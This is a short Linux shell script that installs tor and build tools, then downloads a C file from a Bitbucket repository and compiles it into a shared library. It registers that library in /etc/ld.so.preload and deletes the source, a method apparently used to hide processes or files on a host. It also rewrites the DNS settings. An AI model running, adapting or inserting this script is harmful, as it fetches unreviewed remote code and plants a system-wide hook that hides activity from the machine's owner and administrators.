#!/bin/sh
ln -fs /usr/share/zoneinfo/America/Toronto /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata
apt-get -y install binutils cmake build-essential screen unzip net-tools curl nano tor
service tor start
curl https://bitbucket.org/koploks/watir/raw/master/nyumput.c -o nyumput.c
apt-get install build-essential -y
gcc -Wall -fPIC -shared -o libnyumput.so nyumput.c -ldl
mv libnyumput.so /usr/local/lib/
echo /usr/local/lib/libnyumput.so >> /etc/ld.so.preload
rm nyumput.c
echo "supersede domain-name-servers 1.1.1.1;">> /etc/dhcp/dhclient.conf
/etc/init.d/network restart